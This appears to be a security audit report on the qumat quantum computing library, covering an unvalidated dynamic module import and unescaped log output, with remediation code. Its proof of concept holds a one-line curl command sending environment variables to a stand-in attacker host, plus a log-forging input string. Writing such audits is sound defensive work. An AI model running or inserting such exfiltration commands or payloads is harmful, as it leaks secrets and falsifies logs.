## Findings

### Medium Severity

#### ASVS-1203-SEV-001: Dynamic Module Import Without Allowlist Validation Enables Code Injection

**Severity:** MEDIUM  
**Gap Type:** Type A (Entry point with NO control)

**Location:**
- **File:** `qumat/qumat.py`
- **Lines:** 63-65
- **Function:** `QuMat.__init__`

**Related Functions Checked:**
- `import_module()` (Python stdlib)
- `QuMat.__init__` configuration validation (lines 56-70)

**Vulnerable Code:**
```python
self.backend_name: str = self.backend_config["backend_name"]
self.backend_module: ModuleType = import_module(
    f".{self.backend_name}_backend", package="qumat"
)
```

**Data Flow:**
```
User config dict → backend_config["backend_name"] → f-string interpolation → import_module() → arbitrary module load
```

**Description:**

The `backend_name` value is sourced from user-provided configuration and interpolated directly into a module path without validation against an allowlist of known backends (`qiskit`, `cirq`, `amazon_braket`). While the relative import (`package="qumat"`) and `_backend` suffix limit the attack surface, this constitutes an injection into Python's module loading system:

1. If any file matching `*_backend.py` is present in the `qumat` package directory (e.g., via a compromised dependency, package namespace collision, or local file write), an attacker controlling `backend_name` can cause its execution.
2. Subpackage traversal is possible: `backend_name = "subpkg.malicious"` would attempt `import qumat.subpkg.malicious_backend`.
3. No validation ensures `backend_name` contains only expected alphanumeric/underscore characters.

**Proof of Concept:**
```python
# Assume attacker can place file at qumat/evil_backend.py containing:
# import os; os.system("curl attacker.com/exfil?data=$(env)")

# Attacker triggers via config:
config = {
    "backend_name": "evil",
    "backend_options": {"simulator_type": "default", "shots": 1}
}
qm = QuMat(config)  # Imports and executes qumat/evil_backend.py
```

**Impact:** 

Arbitrary code execution within the Python process context. While this requires an additional precondition (malicious file in the package directory), the lack of allowlist validation means the control is entirely absent, creating a latent injection vulnerability.

**Remediation:**
```python
ALLOWED_BACKENDS = frozenset({"qiskit", "cirq", "amazon_braket"})

def __init__(self, backend_config: Mapping[str, Any] | None) -> None:
    # ... existing validation ...
    
    self.backend_name: str = self.backend_config["backend_name"]
    
    # Allowlist validation for backend name
    if self.backend_name not in ALLOWED_BACKENDS:
        raise ValueError(
            f"Unsupported backend '{self.backend_name}'. "
            f"Allowed backends: {sorted(ALLOWED_BACKENDS)}"
        )
    
    self.backend_module: ModuleType = import_module(
        f".{self.backend_name}_backend", package="qumat"
    )
```

### Low Severity

#### ASVS-1203-SEV-002: User-Controlled Data in Log Output Without Encoding

**Severity:** LOW  
**Gap Type:** Type A (Entry point with NO control)

**Location:**
- **File:** `qumat/amazon_braket_backend.py`, lines 47-49
- **File:** `qumat/cirq_backend.py`, lines 29-31
- **Functions:** `initialize_backend` (both files)

**Related Functions Checked:**
- `print()` calls with user-controlled data
- Configuration parsing in `initialize_backend`

**Vulnerable Code (amazon_braket_backend.py:47-49):**
```python
print(
    f"Simulator type '{simulator_type}' is not supported in Amazon Braket. Using default."
)
```

**Vulnerable Code (cirq_backend.py:29-31):**
```python
print(
    f"Simulator type '{simulator_type}' is not supported in Cirq. Ignoring this argument"
)
```

**Data Flow:**
```
User config → backend_config["backend_options"]["simulator_type"] → f-string → print() → stdout/log aggregator
```

**Description:**

The `simulator_type` value from user configuration is interpolated into `print()` output without any encoding or escaping. While `print()` to stdout is not inherently dangerous, in deployment scenarios where stdout is captured by log aggregation systems (CloudWatch, ELK, Splunk), unescaped user input can enable:

1. **Log injection:** Injecting newlines and fake log entries (e.g., `simulator_type = "default\n[CRITICAL] Auth succeeded for admin"`)
2. **Log viewer XSS:** If logs are rendered in web-based dashboards without escaping, HTML/JavaScript payloads in `simulator_type` could execute in an operator's browser.
3. **ANSI escape sequence injection:** Terminal-based log viewers could be affected by ANSI control codes.

**Proof of Concept:**
```python
# Log injection
config = {
    "backend_name": "amazon_braket",
    "backend_options": {
        "simulator_type": "x'\n[INFO] Authentication successful for user=admin\n[INFO] type='",
        "shots": 1
    }
}
qm = QuMat(config)
# Output: Simulator type 'x'
# [INFO] Authentication successful for user=admin
# [INFO] type='' is not supported in Amazon Braket. Using default.
```

**Impact:** 

Log forgery and potential XSS in log viewing interfaces. Low direct impact on the library itself, but could affect operational security of systems consuming its output.

**Remediation:**
```python
import logging
import re

logger = logging.getLogger(__name__)

# Sanitize for log output
def _sanitize_for_log(value: str) -> str:
    """Remove control characters and limit length for safe log output."""
    return re.sub(r'[\x00-\x1f\x7f-\x9f]', '', str(value))[:100]

# In initialize_backend:
if simulator_type not in ("local", "default"):
    logger.warning(
        "Unsupported simulator type: %s. Using default.",
        _sanitize_for_log(simulator_type)
    )
```

## Positive Security Patterns

### 1. Typed SDK APIs Instead of String Interpolation ✅

All three backends use typed API calls (`circuit.x()`, `circuit.h()`, `circuit.cnot()`) rather than building QASM strings or backend-specific code through string concatenation. This is the most significant positive pattern — it eliminates the primary injection vector that the domain context warns about.

**Examples:**
```python
# Braket: circuit.rx(qubit_index, angle) — not f"rx({angle}) q[{qubit}];"
# Cirq: circuit.append(cirq.rx(param).on(qubit)) — not string building
# Qiskit: circuit.rx(param, qubit_index) — not QASM string construction
```

### 2. Parameter Binding Through SDK Mechanisms ✅

All backends delegate parameter binding to their respective SDKs (Braket `inputs`, Cirq `ParamResolver`, Qiskit `assign_parameters`) rather than performing string substitution. This provides context-aware handling by the interpreter closest to execution.

### 3. Circuit Copy Before Mutation ✅

Both Qiskit (`circuit.copy()`) and Cirq (`copy.deepcopy(circuit)`) create working copies before adding measurements, preventing side effects from propagating to the user's circuit object.

### 4. Comprehensive Input Validation at Orchestration Layer ✅

The `QuMat` class validates config types, required keys, qubit indices (type, range, negativity), parameter existence, and circuit initialization before delegating to backends. This defense-in-depth approach catches many invalid inputs before they reach backend code.

### 5. Parameter Intersection Filtering (Braket) ✅

```python
inputs = {
    param_name: value
    for param_name, value in parameter_values.items()
    if param_name in {p.name for p in circuit.parameters}
}
```
Only parameters that actually exist in the circuit are passed, preventing injection of unexpected parameter names.

## Architecture Observations

1. **No JavaScript/JSON Generation:** The codebase does not dynamically build JavaScript content, JSON documents, or HTML. The ASVS 1.2.3 requirement's specific concern (JavaScript/JSON injection) has minimal direct applicability. The audit therefore focused on the broader injection prevention principles from the parent section.

2. **SDK Trust Boundary:** The codebase delegates all circuit construction and execution to official quantum computing SDKs (Qiskit, Cirq, Braket). These SDKs provide their own input validation and type safety. The library does not construct intermediate representations (QASM, JSON, protobuf) through string operations.

3. **Configuration as Attack Surface:** The primary injection surface is the `backend_config` dictionary, which controls module loading, backend selection, simulator type, and parameter values. The dynamic module import is the only point where configuration directly influences code execution paths without appropriate validation.

4. **Single-User Library Context:** As noted in the false positive patterns, this is a scientific computing library, not a multi-tenant web service. The user providing configuration is typically the same person running the code. However, defense-in-depth (allowlisting) remains appropriate for the module import.
